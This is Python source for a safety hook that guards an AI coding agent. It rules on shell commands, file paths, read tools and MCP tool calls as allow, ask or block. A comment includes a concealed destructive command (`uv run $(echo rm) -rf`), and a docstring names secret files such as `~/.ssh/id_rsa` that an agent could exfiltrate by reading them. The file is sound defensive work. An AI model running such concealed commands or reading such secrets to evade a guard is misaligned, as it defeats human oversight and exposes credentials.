    # ladders, whose prose-prone verb+path pairing is exactly the #915 false
    # positive an anchored ask like `git.commit` exists to absorb. The one
    # exception is a VERB-CONCEALING command: its ask id may be granted or
    # bypass-demoted, so letting it shadow the concealment verdict would
    # compose a grant with a substitution into an unguarded run — concealment
    # is decided after the ladders (a real ladder block still outranks it)
    # and outranks the collected ask.
    concealing = ambiguity_conceals_verb(command) if ambiguous else None
    if first_ask is not None and not concealing:
        return first_ask

    for path in zero_access:
        if any(matches_path_in_command(path, hay) for hay in haystacks):
            if is_command_path_allowed(command, guarded_allowlist(allowed, zero_access), "read"):
                continue
            return {
                "decision": "block",
                "reason": f"Zero-access path: {path}",
                "pattern": f"zeroAccessPath: {path}",
                "id": "core.zero-access-path",
                "command": command,
            }

    # The readOnly/noDelete ladders pair a destructive verb with the path, so
    # the verb must come from command text, never quoted content (#922) — the
    # keep-predicate haystacks keep path-mentioning operands visible while
    # masking prose. zeroAccessPaths stays on the raw haystacks: it blocks a
    # MENTION regardless of any verb, so masking has nothing to fix there.
    # Consumers fed from elsewhere (pipe, xargs, loop, substitution) and direct
    # mv/cp operands: scanned once, judged per guarded path (#1128, #1127).
    scan = producer_scan(command)
    fed_ask: Optional[Dict[str, Any]] = None
    rename_ask: Optional[Dict[str, Any]] = None

    def _fed_possible(path: str) -> Dict[str, Any]:
        return {
            "decision": "ask",
            "reason": (
                f"Unverifiable command (a delete is fed by a producer that may emit {path}) — "
                "nothing can analyze what the pipe carries, so a human must confirm it "
                "(not demoted by bypass)"
            ),
            "pattern": f"producerFedDelete: {path}",
            "command": command,
            "id": "core.producer-fed-delete",
            "unverifiable": True,
        }

    for path in read_only:
        op = None
        for hay in path_ladder_haystacks(command, path):
            matched, reason = check_path_patterns(hay, path, READ_ONLY_BLOCKED, "read-only path")
            if matched:
                op = _infer_operation_from_reason(reason)
                break
        fed = producer_fed_hit(scan, path, DELETE_PATTERNS, cwd) if op is None else None
        if fed == "named":
            op = "delete"
        elif fed == "possible" and fed_ask is None and not is_command_path_allowed(
            command, guarded_allowlist(allowed, read_only), "delete"
        ):
            fed_ask = _fed_possible(path)
        if op is not None:
            if is_command_path_allowed(
                command, guarded_allowlist(allowed, read_only), op,
                covered=recursive_covered if op == "delete" else None,
            ):
                continue
            return {
                "decision": "block",
                "reason": f"Read-only path: {path}",
                "pattern": f"readOnlyPath: {path}",
                "id": "core.read-only-path",
                "command": command,
            }

    for path in no_delete:
        fed = producer_fed_hit(scan, path, NO_DELETE_BLOCKED, cwd)
        moved = move_overwrite_hit(scan, path, cwd)
        if moved and moved[0] == "ask":
            if rename_ask is None and not is_command_path_allowed(
                command, guarded_allowlist(allowed, no_delete), "delete"
            ):
                rename_ask = {
                    "decision": "ask",
                    "reason": f"No-delete path: {path} ({moved[1]}) — confirm the rename",
                    "pattern": f"noDeletePath: {path}",
                    "command": command,
                    "id": "core.guarded-rename",
                }
            moved = None
        if fed == "named" or moved or any(
            check_path_patterns(
                hay, path, DELETE_PATTERNS if path.endswith("/") else NO_DELETE_BLOCKED, "no-delete path"
            )[0]
            # `>|` (clobber) is read as a pipe by the scanner; it is a redirect.
            for hay in path_ladder_haystacks(command.replace(">|", ">"), path)
        ):
            if is_command_path_allowed(
                command, guarded_allowlist(allowed, no_delete), "delete", covered=recursive_covered
            ):
                continue
            return {
                "decision": "block",
                "reason": f"No-delete path: {path}" + (f" ({moved[1]})" if moved else ""),
                "pattern": f"noDeletePath: {path}",
                "command": command,
                "id": "core.no-delete-path",
            }
        if fed == "possible" and fed_ask is None and not is_command_path_allowed(
            command, guarded_allowlist(allowed, no_delete), "delete"
        ):
            fed_ask = _fed_possible(path)

    if fed_ask is not None:
        return fed_ask
    if rename_ask is not None:
        return rename_ask

    # Verb concealment outranks the ordinary ask collected above (`uv run
    # $(echo rm) -rf` matches the uv-run ask rule, whose id may carry an
    # unattended grant and is demoted by bypass — the unverifiable tier must
    # win whenever the command's verb cannot be seen), and only a real block
    # outranks concealment.
    if concealing:
        return {
            "decision": "ask",
            "reason": (
                f"Unverifiable command ({concealing}) — nothing can "
                "analyze what this runs, so a human must confirm it "
                "(not demoted by bypass)"
            ),
            "pattern": f"ambiguous:{concealing}",
            "command": command,
            "id": "core.ambiguous-command",
            "unverifiable": True,
        }

    if first_ask is not None:
        return first_ask

    # Nothing matched. If the command hid behind substitution/eval/etc. we
    # could not verify it statically — fail closed to ``ask``. Two populations
    # share this fallback and resolve differently by mode (#934): a
    # verb-concealing shape is UNVERIFIABLE-BY-CONSTRUCTION, and the hooks do
    # not demote it to allow under bypassPermissions/auto — obscuring a
    # payload must never be the permissive path. An operand-position
    # substitution keeps the ordinary ask tier, which bypass demotes (the
    # documented "don't stop me for things you recognize" trade). Unattended
    # resolves both to block (minus grants).
    if ambiguous:
        # Concealing shapes returned above, before the ask ladder; what
        # reaches here is operand-position substitution — the ordinary,
        # bypass-demotable confirm.
        return {
            "decision": "ask",
            "reason": f"Unverifiable command ({ambiguous}) — confirm before running",
            "pattern": f"ambiguous:{ambiguous}",
            "command": command,
            "id": "core.ambiguous-command",
        }

    verdict = {
        "decision": "allow",
        "reason": "No patterns matched",
        "pattern": None,
        "command": command,
    }
    if recursive_grants:
        verdict["allowed_by"] = "delete-recursive: " + ", ".join(recursive_grants)
    return verdict


def check_path(file_path: str, config: Dict[str, Any]) -> Tuple[bool, str]:
    """:func:`_check_path_form` over the lexical and symlink-resolved path (#1217)."""
    for form in _path_forms(file_path):
        blocked, reason = _check_path_form(form, config)
        if blocked:
            return True, reason
    return False, ""


def _check_path_form(file_path: str, config: Dict[str, Any]) -> Tuple[bool, str]:
    """File-path-only check used by edit/write hooks. Returns ``(blocked, reason)``.

    The protected control plane is checked FIRST, before the kill switch — the
    files that gate safety stay agent-unwritable even when safety is disabled;
    only the user's allowlist re-permits them (#466).
    """
    allowed = load_allowed_paths(config)

    prot_blocked, prot_reason = check_protected_path(file_path, allowed)
    if prot_blocked:
        return True, prot_reason

    safety_cfg = config.get("safety", {}) if isinstance(config.get("safety"), dict) else {}
    if safety_cfg.get("enabled", True) is False:
        return False, ""

    guarded = list(config.get("zeroAccessPaths", [])) + list(config.get("readOnlyPaths", []))
    if is_path_allowed_for_op(file_path, guarded_allowlist(allowed, guarded), "edit"):
        return False, ""

    for zero_path in config.get("zeroAccessPaths", []):
        if match_path(file_path, zero_path):
            return True, f"zero-access path {zero_path} (no operations allowed)"

    for readonly in config.get("readOnlyPaths", []):
        if match_path(file_path, readonly):
            return True, f"read-only path {readonly}"

    return False, ""


def check_read_path(file_path: str, config: Dict[str, Any]) -> Tuple[bool, str]:
    """:func:`_check_read_path_form` over the lexical and resolved path (#1217)."""
    for form in _path_forms(file_path):
        blocked, reason = _check_read_path_form(form, config)
        if blocked:
            return True, reason
    return False, ""


def _check_read_path_form(file_path: str, config: Dict[str, Any]) -> Tuple[bool, str]:
    """File-path-only check for content-reading tools (Read/Grep/Glob).

    The Bash/Edit/Write hooks never see native ``Read``/``Grep``/``Glob`` tool
    calls, so a ``zeroAccessPaths`` secret (``~/.agentwire/.env``, ``~/.ssh/id_rsa``,
    ``*.pem``) could be exfiltrated by reading it directly. Claude Code fires a
    blocking ``PreToolUse`` hook for these tools too, so the read-tool hook runs
    ``file_path`` through this check and blocks a zero-access read.

    Only ``zeroAccessPaths`` deny reads — ``readOnlyPaths`` are readable by
    definition, and the control plane is host-owned config the agent may read
    (only its *writes* are blocked). The kill switch disables this like any other
    rule; the allowlist (a human opt-in) re-permits a specific read.
    """
    allowed = guarded_allowlist(load_allowed_paths(config), config.get("zeroAccessPaths", []))
    if is_path_allowed_for_op(file_path, allowed, "read"):
        return False, ""

    safety_cfg = config.get("safety", {}) if isinstance(config.get("safety"), dict) else {}
    if safety_cfg.get("enabled", True) is False:
        return False, ""

    for zero_path in config.get("zeroAccessPaths", []):
        if match_path(file_path, zero_path):
            return True, f"zero-access path {zero_path} (no read access)"

    return False, ""


# ============================================================================
# MCP TOOL POLICY (#923)
# ============================================================================
#
# The bash rules are written against shell command STRINGS; an MCP tool call is
# a name plus a JSON argument object, so those rules cannot transfer without
# importing the string-matching defects (#915/#916). What a rule MEANS for a
# structured tool call is a per-tool classification — issue #923's option (1):
# each tool carries a tier the same decision ladder the Bash hook uses, with a
# stable id that ``unattended_allow`` / ``disabled_rules`` can name.
#
# Policies live in the same rule YAMLs the heal deploys, under
# ``mcpToolPolicies``. An entry is::
#
#     - tool: mcp__agentwire__worktree_remove   # exact full tool name, OR
#       match: "(write|delete|remove)"          # regex searched on the name
#       tier: ask            # allow | ask | block   (default: ask)
#       mutates: true        # screen protected control-plane path args
#       id: mcp.agentwire.worktree-remove
#       reason: tears down a worktree and can delete a branch
#
# First match wins, in rule-file load order. ``mutates`` decides whether the
# tool's path-valued arguments are screened against the PROTECTED control
# plane (zero-access secrets are screened for every tool regardless — the
# path's mere presence in a call is the leak). Defaulted to true for any
# non-``allow`` tier.
#
# THE DEFAULT FOR UNCLASSIFIED TOOLS — the decision #923 calls "the whole
# design" — is ALLOW with path screening, i.e. exactly the #1036 posture,
# stated as data rather than implied by a matcher. Fail-closed would make
# every unclassified tool (every third-party server, every tool added after
# this file shipped) dead until classified — and in an unattended session a
# wrongful tool refusal is a silent loop, which prices worse than the residual
# gap: the dangerous core is classified explicitly, secrets are screened for
# every tool, and control-plane writes are caught by the bundled name-shape
# fallback entry (data, host-editable — no longer a hardcoded regex).

_MCP_TIERS = {"allow", "ask", "block"}


def check_mcp_tool(tool_name: str, config: Dict[str, Any]) -> Dict[str, Any]:
    """Decide allow/ask/block for an MCP tool CALL by per-tool policy (#923).

    Returns ``{decision, reason, id, mutates, matched}`` — the same decision
    vocabulary as :func:`check_command`, so the hook's unattended fail-closed
    ladder and ``unattended_allow`` grants apply to tools unchanged. A tool
    call names no filesystem target, so grants are evaluated with
    ``scopeable=False`` by the caller (a path-scoped grant refuses).

    ``mutates`` is None when NO policy matched — the caller distinguishes
    "classified as non-mutating" from "unclassified" (the latter may fall back
    to a bridge heuristic on installs whose rules dir predates mcp-tools.yaml).
    """
    safety_cfg = config.get("safety", {}) if isinstance(config.get("safety"), dict) else {}
    disabled_rules = set(safety_cfg.get("disabled_rules", []) or [])

    # No YAML parser ⇒ no policies loaded ⇒ fail closed, same as check_command.
    if config.get("_parser_unavailable"):
        return {
            "decision": "block",
            "reason": str(config["_parser_unavailable"]),
            "id": None,
            "mutates": None,
            "matched": False,
        }

    if safety_cfg.get("enabled", True) is False:
        return {
            "decision": "allow",
            "reason": "safety disabled",
            "id": None,
            "mutates": None,
            "matched": False,
            "disabled": True,
        }

    for entry in config.get("mcpToolPolicies", []) or []:
        if not isinstance(entry, dict):
            continue
        rule_id = entry.get("id")
        if rule_id and rule_id in disabled_rules:
            continue
        exact = entry.get("tool")
        pattern = entry.get("match")
        hit = False
        if isinstance(exact, str) and exact:
            hit = exact == tool_name
        elif isinstance(pattern, str) and pattern:
            try:
                hit = bool(_rx(pattern).search(tool_name))
            except re.error:
                continue
        if not hit:
            continue
        tier = str(entry.get("tier", "ask")).strip().lower()
        if tier not in _MCP_TIERS:
            # An unknown tier is a policy the author believes they set. Fail
            # toward the confirmable middle, never silently to allow.
            tier = "ask"
        return {
            "decision": tier,
            "reason": entry.get("reason", f"MCP tool policy {rule_id or exact or pattern}"),
            "id": rule_id,
            "mutates": bool(entry.get("mutates", tier != "allow")),
            "matched": True,
        }

    return {
        "decision": "allow",
        "reason": "no MCP tool policy matched",
        "id": None,
        "mutates": None,
        "matched": False,
    }
# === END GENERATED ===

# An audit-log failure never changes the decision (#1108).
log_allowed, log_blocked, log_disabled = (
    audit_best_effort(f) for f in (log_allowed, log_blocked, log_disabled)
)


# ============================================================================
# HOOK ENTRY POINT
# ============================================================================


def _resolve_rules_dir():
    user_dir = Path(os.environ.get("AGENTWIRE_DIR", os.path.expanduser("~/.agentwire")))
    user_rules = user_dir / "damage-control"
    if user_rules.exists() and any(user_rules.glob("*.yaml")):
        return user_rules
    return [Path(__file__).parent / "rules", Path(__file__).parent / "agentwire-rules"]


# Tools that read file content (or list paths), keyed to the tool_input field
# that names the target path. ``Glob`` only reveals filenames, but a zero-access
# directory is still off-limits, so it is covered for consistency.
READ_TOOL_PATH_FIELDS = {
    "Read": "file_path",
    "Grep": "path",
    "Glob": "path",
}


def main() -> None:
    config = load_config(_resolve_rules_dir())
    config["safety"] = load_safety_config()

    input_data = read_hook_input()

    # Session attribution for audit rows (#940): hand the parsed payload to
    # audit_logger so every log_* call carries the conversation id. Fail-open.
    try:
        import audit_logger as _audit_logger
        _audit_logger.HOOK_INPUT = input_data
    except Exception:
        pass

    tool_name = input_data.get("tool_name", "")
    tool_input = input_data.get("tool_input", {})

    field = READ_TOOL_PATH_FIELDS.get(tool_name)
    if not field:
        sys.exit(0)

    file_path = tool_input.get(field, "")
    if not file_path:
        sys.exit(0)

    blocked, reason = check_read_path(file_path, config)
    if blocked:
        log_blocked(tool_name, file_path, reason)
        print(f"SECURITY: Blocked read of {reason}: {file_path}", file=sys.stderr)
        sys.exit(2)

    if config["safety"].get("enabled", True) is False:
        log_disabled(tool_name, file_path)
        sys.exit(0)

    log_allowed(tool_name, file_path, user_approved=False)
    sys.exit(0)


if __name__ == "__main__":
    run_hook_guarded(main)
